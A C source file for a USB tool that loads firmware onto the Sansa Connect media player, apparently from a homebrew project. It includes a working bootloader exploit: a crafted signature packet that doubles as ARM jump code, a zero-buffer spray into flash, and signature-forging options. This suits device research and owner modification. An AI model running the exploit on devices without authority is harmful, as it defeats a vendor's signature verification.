/*
 *  Copyright (c) 2011 Tomasz Moń <desowin@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; under version 3 of the License.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses>.
 */

#include <libusb-1.0/libusb.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include "signature.h"
#include "srr.h"

#define TIMEOUT 1000

#define BUFFER_SIZE 4096
#define MAXIMUM_VMLINUX_PAYLOAD (0x200000 - 16 - 2048)
/* A little bit more than the minimum required on bootloader 24655.
 * If you have different bootloader and the device crashes after loading
 * exploit, try increasing the value (260) and report what value works.
 * The maximum is 479.
 */
#define EXPLOIT_INITRD_ZERO_BUFFERS (260)
#define ALT_ENTRY_POINT (0x320000 + 16 + EXPLOIT_INITRD_ZERO_BUFFERS * BUFFER_SIZE)

static unsigned char exploit_signature[2048] =
{
    /* In alternative exploit mode the signature itself gets executed */
    /* 88 00 03 05   streq r0,[r3,#-0x88] */
    0x88, /* RFC4880 packet type: signature, old format, two byte length follows */
    0x00, /* Packet length, ignored by bootloader */
    0x03, /* Signature version 3 */
    0x05, /* Must be 5 according to RFC4880 */
    /* 00 00 00 00   addeq r0, r0, r0 */
    0x00, /* RFC4880 signature type: binary document */
    /* 4-byte creation time, 8-byte Key ID of the signer, ignored by bootloader*/
    0x00, 0x00, 0x00,
    /* 04 F0 1F E5   ldr pc, [pc, #-4] */
    0x04, 0xF0, 0x1F, 0xE5,
    (ALT_ENTRY_POINT & 0x000000FF),
    (ALT_ENTRY_POINT & 0x0000FF00) >> 8,
    (ALT_ENTRY_POINT & 0x00FF0000) >> 16,
    (ALT_ENTRY_POINT & 0xFF000000) >> 24,
    0x00,
    0x01, /* Public Key algorithm: RSA (Encrypt or Sign) */
    0x02, /* Hash type: SHA1 */
    0x00, 0x00, /* Left 16 bits of signed hash message, ignored by bootloader */
    0x11, 0x88, /* MPI Length in bits (Big Endian) */
    /* Then follows Big Endian MPI Data (RSA Signature) */
    0x56, 0x75, 0x6C, 0x6E, 0x65, 0x72, 0x61, 0x62,
    0x69, 0x6C, 0x69, 0x74, 0x79, 0x20, 0x64, 0x69,
    0x73, 0x63, 0x6F, 0x76, 0x65, 0x72, 0x65, 0x64,
    0x20, 0x69, 0x6E, 0x20, 0x32, 0x30, 0x31, 0x36,
    0x20, 0x61, 0x6E, 0x64, 0x20, 0x65, 0x78, 0x70,
    0x6C, 0x6F, 0x69, 0x74, 0x65, 0x64, 0x20, 0x69,
    0x6E, 0x20, 0x32, 0x30, 0x32, 0x31, 0x20, 0x62,
    0x79, 0x20, 0x54, 0x6F, 0x6D, 0x61, 0x73, 0x7A,
    0x20, 0x4D, 0x6F, 0x6E, 0x20, 0x3C, 0x64, 0x65,
    0x73, 0x6F, 0x77, 0x69, 0x6E, 0x40, 0x67, 0x6D,
    0x61, 0x69, 0x6C, 0x2E, 0x63, 0x6F, 0x6D, 0x3E,
};

static int transmit_data(struct libusb_device_handle *handle, int endpoint, unsigned char *buf, int len)
{
    int val;
    int i;

    while (len > 0)
    {
        val = libusb_bulk_transfer(handle, endpoint, buf, len, &i, TIMEOUT);

        switch (val)
        {
            case 0: break;

            default:
                fprintf(stderr, "Error transmitting, error code %d\n", val);
                return val;
        }
        len -= i;
    }
    return val;
}

static bool bootloader_transfer_files(char **filenames, int n_files)
{
    struct libusb_device_handle *handle;
    int file_nr;
    int result;
    unsigned char buf[BUFFER_SIZE];

    result = libusb_init(NULL);
    if (result < 0)
    {
        fprintf(stderr, "Failed to initialise libusb\n");
        return 1;
    }

    handle = libusb_open_device_with_vid_pid(NULL, 0x0781, 0x7481);
    if (!handle)
    {
        fprintf(stderr, "Unable to open Sansa Connect\n");
        libusb_exit(NULL);
        return false;
    }

    result = libusb_claim_interface(handle, 0);
    if (result != 0)
    {
        printf("claim resulted with %d\n", result);
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }

    for (file_nr = 0; file_nr < n_files; file_nr++)
    {
        FILE *f = fopen(filenames[file_nr], "r");
        if (f == NULL)
        {
            fprintf(stderr, "Unable to open file %s\n", filenames[file_nr]);
            libusb_close(handle);
            libusb_exit(NULL);
            return false;
        }
        printf("Opening %s\n", filenames[file_nr]);

        /* Read header */
        fread(buf, sizeof(char), 16, f);

        /* Check magic */
        if (buf[0] != 0xAA || buf[1] != 0xBB ||
            buf[2] != 0xFF || buf[3] != 0xEE)
        {
            fprintf(stderr, "File %s is not valid .srr file\n",
                    filenames[file_nr]);
            fclose(f);
            continue;
        }

        /* Send header to device */
        libusb_control_transfer(handle,
                                0x40, 0x00, 0xEEEE, 0xEEEE,
                                buf, 16, TIMEOUT);

        /* Send data to device */
        while (!feof(f))
        {
            size_t len;

            len = fread(buf, sizeof(char), sizeof(buf), f);

            if (transmit_data(handle, 1, buf, len) != 0)
            {
                fclose(f);
                libusb_close(handle);
                libusb_exit(NULL);
                return false;
            }

            printf(".");
            fflush(stdout);
        }
        printf("Done\n");
        fclose(f);
    }

    /* Notify device that all files are sent */
    libusb_control_transfer(handle,
                            0x40, 0x00, 0xFFFF, 0xFFFF,
                            NULL, 0, TIMEOUT);

    result = libusb_release_interface(handle, 0);
    if (result < 0)
    {
        printf("unable to release interface!\n");
    }

    libusb_close(handle);
    libusb_exit(NULL);
    return true;
}

static bool exploit_transfer_data(unsigned char *data, int data_size,
                                  unsigned char *initrd_payload, int initrd_payload_size)
{
    struct libusb_device_handle *handle;
    int i;
    int result;
    unsigned char buf[BUFFER_SIZE];
    unsigned char payload_header[16] =
    {
        0xAA, 0xBB, 0xFF, 0xEE, /* Magic */
        0x00, 0x00, 0x00, 0x01, /* Load address for binary data */
        0x00, 0x00, 0x00, 0x01, /* Entry point (set by exploit) */
        (data_size & 0x000000FF),
        (data_size & 0x0000FF00) >> 8,
        (data_size & 0x00FF0000) >> 16,
        (data_size & 0xFF000000) >> 24,
    };
    unsigned char zero_fill_header[16] =
    {
        0xAA, 0xBB, 0xFF, 0xEE, /* Magic */
        0x00, 0x00, 0x44, 0x01, /* Load address for data */
        0xFF, 0xFF, 0xFF, 0xFF, /* Place at initrd flash region */
        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x000000FF),
        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x0000FF00) >> 8,
        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0x00FF0000) >> 16,
        ((EXPLOIT_INITRD_ZERO_BUFFERS * sizeof(buf) + initrd_payload_size) & 0xFF000000) >> 24,
    };

    result = libusb_init(NULL);
    if (result < 0)
    {
        fprintf(stderr, "Failed to initialise libusb\n");
        return 1;
    }

    handle = libusb_open_device_with_vid_pid(NULL, 0x0781, 0x7481);
    if (!handle)
    {
        fprintf(stderr, "Unable to open Sansa Connect\n");
        libusb_exit(NULL);
        return false;
    }

    result = libusb_claim_interface(handle, 0);
    if (result != 0)
    {
        printf("claim resulted with %d\n", result);
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }

    printf("Sending payload with exploit signature to device\n");
    libusb_control_transfer(handle,
                            0x40, 0x00, 0xEEEE, 0xEEEE,
                            payload_header, sizeof(payload_header), TIMEOUT);
    for (i = 0; i < data_size; i += 4096)
    {
        int remaining = data_size - i;
        int to_send = (remaining > 4096) ? 4096 : remaining;
        if (transmit_data(handle, 1, &data[i], to_send) != 0)
        {
            libusb_close(handle);
            libusb_exit(NULL);
            return false;
        }
        printf(".");
        fflush(stdout);
    }

    printf("\nSending zero fill to device\n");
    libusb_control_transfer(handle,
                            0x40, 0x00, 0xEEEE, 0xEEEE,
                            zero_fill_header, sizeof(zero_fill_header), TIMEOUT);
    memset(buf, 0, sizeof(buf));
    for (i = 0; i < EXPLOIT_INITRD_ZERO_BUFFERS; i++)
    {
        if (transmit_data(handle, 1, buf, sizeof(buf)) != 0)
        {
            libusb_close(handle);
            libusb_exit(NULL);
            return false;
        }
        printf(".");
        fflush(stdout);
    }
    if (initrd_payload_size > 0)
    {
        printf("\nSending initrd payload to device\n");
        for (i = 0; i < initrd_payload_size; i += 4096)
        {
            int remaining = initrd_payload_size - i;
            int to_send = (remaining > 4096) ? 4096 : remaining;
            if (transmit_data(handle, 1, &initrd_payload[i], to_send) != 0)
            {
                libusb_close(handle);
                libusb_exit(NULL);
                return false;
            }
            printf(".");
            fflush(stdout);
        }
    }
    printf("\nDone\n");

    /* Notify device that all files are sent */
    libusb_control_transfer(handle,
                            0x40, 0x00, 0xFFFF, 0xFFFF,
                            NULL, 0, TIMEOUT);

    result = libusb_release_interface(handle, 0);
    if (result < 0)
    {
        printf("unable to release interface!\n");
    }

    libusb_close(handle);
    libusb_exit(NULL);
    return true;
}

static bool exploit_load(char *filename, bool alternative)
{
    bool result;
    unsigned char *buf;
    int file_len;
    int buf_len;

    FILE *f = fopen(filename, "rb");
    if (f == NULL)
    {
        fprintf(stderr, "Unable to open file %s\n", filename);
        return false;
    }
    printf("Opening %s\n", filename);

    fseek(f, 0L, SEEK_END);
    file_len = ftell(f);
    fseek(f, 0L, SEEK_SET);

    if ((file_len < 0) || (file_len > MAXIMUM_VMLINUX_PAYLOAD))
    {
        fprintf(stderr, "Invalid file size (maximum is %d bytes)\n",
                MAXIMUM_VMLINUX_PAYLOAD);
        fclose(f);
        return false;
    }

    buf_len = file_len + sizeof(exploit_signature);
    buf = (unsigned char *)malloc(buf_len);
    if (buf == NULL)
    {
        printf("Failed to allocate memory for file contents!\n");
        fclose(f);
        return false;
    }

    /* Read file and append exploit signature */
    if (file_len != fread(buf, sizeof(unsigned char), file_len, f))
    {
        printf("Did not read complete file!\n");
        fclose(f);
        return false;
    }

    memcpy(&buf[buf_len - sizeof(exploit_signature)], exploit_signature, sizeof(exploit_signature));

    if (alternative)
    {
        /* payload in initrd image, chainloaded from exploit signature */
        result = exploit_transfer_data(exploit_signature, sizeof(exploit_signature), buf, file_len);
    }
    else
    {
        /* payload in kernel image */
        result = exploit_transfer_data(buf, buf_len, NULL, 0);
    }

    fclose(f);
    free(buf);
    return result;
}

static bool linux_transfer_files(char **filenames, int n_files)
{
    struct libusb_device_handle *handle;
    int file_nr;
    int result;
    unsigned char buf[497];
    unsigned char cmd_buf[8];
    int i;

    result = libusb_init(NULL);
    if (result < 0)
    {
        fprintf(stderr, "Failed to initialise libusb\n");
        return 1;
    }

    handle = libusb_open_device_with_vid_pid(NULL, 0x0781, 0x7482);
    if (!handle)
    {
        fprintf(stderr, "Unable to open Sansa Connect\n");
        libusb_exit(NULL);
        return false;
    }

    result = libusb_claim_interface(handle, 0);
    if (result != 0)
    {
        printf("claim resulted with %d\n", result);
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }

    /* Perform handshake. */
    memset(&cmd_buf[0], 0xEE, sizeof(cmd_buf));
    if (transmit_data(handle, 0x02, &cmd_buf[0], sizeof(cmd_buf)) != 0)
    {
        fprintf(stderr, "Handshake send failed\n");
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }

    /* Read response. */
    if (transmit_data(handle, 0x81, &cmd_buf[0], sizeof(cmd_buf)) != 0)
    {
        fprintf(stderr, "Handshake read failed\n");
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }
    for (i = 0; i < sizeof(cmd_buf); i++)
    {
        if (cmd_buf[i] != 0xDD)
        {
            fprintf(stderr, "Received invalid handshake string\n");
            libusb_close(handle);
            libusb_exit(NULL);
            return false;
        }
    }
    fprintf(stdout, "Handshake succeeded\n");

    for (file_nr = 0; file_nr < n_files; file_nr++)
    {
        FILE *f = fopen(filenames[file_nr], "r");
        int32_t file_length, transferred, previous_dot;
        if (f == NULL)
        {
            fprintf(stderr, "Unable to open file %s\n", filenames[file_nr]);
            libusb_close(handle);
            libusb_exit(NULL);
            return false;
        }
        printf("Sending %s\n", filenames[file_nr]);

        fseek(f, 0L, SEEK_END);
        file_length = ftell(f);
        fseek(f, 0L, SEEK_SET);

        /* Inform device about new file */
        memset(&cmd_buf[0], 0xFF, sizeof(cmd_buf));
        cmd_buf[4] = (file_length & 0x000000FF);
        cmd_buf[5] = (file_length & 0x0000FF00) >> 8;
        cmd_buf[6] = (file_length & 0x00FF0000) >> 16;
        cmd_buf[7] = (file_length & 0xFF000000) >> 24;
        if (transmit_data(handle, 0x02, &cmd_buf[0], sizeof(cmd_buf)) != 0)
        {
            fprintf(stderr, "Failed to sent file header\n");
            libusb_close(handle);
            libusb_exit(NULL);
            fclose(f);
            return false;
        }

        /* Send data to device */
        transferred = previous_dot = 0;
        while (!feof(f))
        {
            size_t len;

            len = fread(buf, sizeof(char), sizeof(buf), f);

            if (transmit_data(handle, 0x02, buf, len) != 0)
            {
                fclose(f);
                libusb_close(handle);
                libusb_exit(NULL);
                return false;
            }

            transferred += len;
            if ((transferred - previous_dot) >= (file_length / 20))
            {
                previous_dot = transferred;
                printf(".");
                fflush(stdout);
            }
        }
        printf("Done\n");
        fclose(f);
    }

    /* Notify device that all files are sent */
    memset(&cmd_buf[0], 0xFF, sizeof(cmd_buf));
    if (transmit_data(handle, 0x02, &cmd_buf[0], sizeof(cmd_buf)) != 0)
    {
        fprintf(stderr, "Failed to sent transmit complete command\n");
        libusb_close(handle);
        libusb_exit(NULL);
        return false;
    }

    result = libusb_release_interface(handle, 0);
    if (result < 0)
    {
        printf("unable to release interface!\n");
    }

    libusb_close(handle);
    libusb_exit(NULL);
    return true;
}

static bool check_file(const char *filename)
{
    uint8_t *buf;
    int buf_len;

    FILE *f = fopen(filename, "r");
    if (f == NULL)
    {
        fprintf(stderr, "Unable to open file %s\n", filename);
        return false;
    }
    printf("Opening %s\n", filename);

    fseek(f, 0L, SEEK_END);
    buf_len = ftell(f);
    fseek(f, 0L, SEEK_SET);

    buf = (uint8_t*)malloc(buf_len);
    if (buf == NULL)
    {
        printf("Failed to allocate memory for file contents!\n");
        return false;
    }

    /* Read file */
    fread(buf, sizeof(char), buf_len, f);

    print_srr_file_info(buf, buf_len);

    free(buf);
    return true;
}

static bool forge_file(const char *filename)
{
    uint8_t *buf;
    int buf_len;
    bool success;

    FILE *f = fopen(filename, "r");
    if (f == NULL)
    {
        fprintf(stderr, "Unable to open file %s\n", filename);
        return false;
    }
    printf("Opening %s\n", filename);

    fseek(f, 0L, SEEK_END);
    buf_len = ftell(f);
    fseek(f, 0L, SEEK_SET);

    buf = (uint8_t*)malloc(buf_len);
    if (buf == NULL)
    {
        printf("Failed to allocate memory for file contents!\n");
        return false;
    }

    /* Read file */
    fread(buf, sizeof(char), buf_len, f);
    success = forge_signature(buf, buf_len);
    free(buf);

    return success;
}

int main(int argc, char **argv)
{
    int c;
    char **filenames;
    int n_files;
    int retval = 0;

    for (;;)
    {
        static struct option long_options[] =
        {
            /* These options set a flag. */
            {"exploit",             required_argument, 0, 'e'},
            {"alternative-exploit", required_argument, 0, 'a'},
            {"bootloader",          required_argument, 0, 'b'},
            {"linux",               required_argument, 0, 'l'},
            {"check",               required_argument, 0, 'c'},
            {"srrgen",              required_argument, 0, 's'},
            {"forge",               required_argument, 0, 'f'},
            {0, 0, 0, 0}
        };
        /* getopt_long stores the option index here. */
        int option_index = 0;

        c = getopt_long(argc, argv, "e:a:b:l:c:s:f:",
                        long_options, &option_index);

        /* Detect the end of the options. */
        if (c == -1)
            break;

        switch (c)
        {
            case 'e':
                if (!exploit_load(argv[optind - 1], false))
                {
                    fprintf(stderr, "Failed to transfer payload to bootloader\n");
                    retval = 1;
                }
                break;
            case 'a':
                if (!exploit_load(argv[optind - 1], true))
                {
                    fprintf(stderr, "Failed to transfer payload to bootloader\n");
                    retval = 1;
                }
                break;
            case 'b':
                filenames = &argv[optind - 1];
                n_files = 1;
                while (optind < argc && *argv[optind] != '-')
                {
                    optind++;
                    n_files++;
                }
                if (!bootloader_transfer_files(filenames, n_files))
                {
                    fprintf(stderr, "Failed to transfer files to bootloader\n");
                    retval = 1;
                }
                break;
            case 'l':
                filenames = &argv[optind - 1];
                n_files = 1;
                while (optind < argc && *argv[optind] != '-')
                {
                    optind++;
                    n_files++;
                }
                if (!linux_transfer_files(filenames, n_files))
                {
                    fprintf(stderr, "Failed to transfer files to linux\n");
                    retval = 1;
                }
                break;
            case 'c':
                if (!check_file(optarg))
                {
                    fprintf(stderr, "Check file failed\n");
                    retval = 1;
                }
                break;
            case 's':
                filenames = &argv[optind - 1];
                if (optind < argc && *argv[optind] != '-')
                {
                    optind++;
                    generate_srr(filenames[0], filenames[1]);
                }
                else
                {
                    fprintf(stderr, "Missing output filename");
                }
                break;
            case 'f':
                if (!forge_file(optarg))
                {
                    retval = 1;
                }
                break;
            default:
                break;
        }
    }

    return retval;
}
